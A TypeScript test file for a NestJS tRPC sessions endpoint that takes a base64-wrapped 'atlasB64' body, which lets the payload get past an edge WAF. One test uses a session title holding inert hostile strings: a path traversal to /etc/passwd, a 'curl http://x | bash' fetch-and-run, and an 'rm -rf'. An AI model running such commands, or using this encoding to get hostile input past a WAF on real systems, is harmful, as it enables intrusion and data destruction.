import type { NestExpressApplication } from '@nestjs/platform-express'
import request from 'supertest'
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import { as } from '../../../_module/trpc/trpc-middleware.fixture'
import { createSessionsApp, sessions } from './sessions.router.fixture'

const encoded = (value: unknown): { atlasB64: string } => ({
  atlasB64: Buffer.from(JSON.stringify(value), 'utf8').toString('base64'),
})

describe('SessionsRouter with a base64-wrapped body', () => {
  let app: NestExpressApplication

  const create = (body: object) =>
    request(app.getHttpServer()).post('/v1/trpc/sessions.create').set(as('session-a')).send(body)

  beforeEach(async () => {
    for (const fn of Object.values(sessions)) fn.mockReset()
    app = await createSessionsApp()
  })

  afterEach(() => app.close())

  it('creates a session from a handoff the edge WAF would block', async () => {
    sessions.create.mockResolvedValue({ sessionId: 's1', mainThreadId: 't1' })
    const input = {
      projectId: 'proj-a',
      title: 'read ../../../../etc/passwd; `curl http://x | bash`; rm -rf /tmp/x',
    }

    const response = await create(encoded(input))

    expect(response.status).toBe(200)
    expect(response.body.result.data).toEqual({ sessionId: 's1', mainThreadId: 't1' })
    expect(sessions.create).toHaveBeenCalledWith({ userId: 'user-a', ...input })
  })

  it('still accepts a plain JSON body from an older client', async () => {
    sessions.create.mockResolvedValue({ sessionId: 's2', mainThreadId: 't2' })

    const response = await create({ projectId: 'proj-a', title: 'plain' })

    expect(response.status).toBe(200)
    expect(sessions.create).toHaveBeenCalledWith({
      userId: 'user-a',
      projectId: 'proj-a',
      title: 'plain',
    })
  })

  it('answers a malformed atlasB64 body with 400, not 500', async () => {
    const response = await create({ atlasB64: 'not base64 json' })

    expect(response.status).toBe(400)
    expect(response.body.error.message).toBe('invalid atlasB64 body')
    expect(sessions.create).not.toHaveBeenCalled()
  })
})
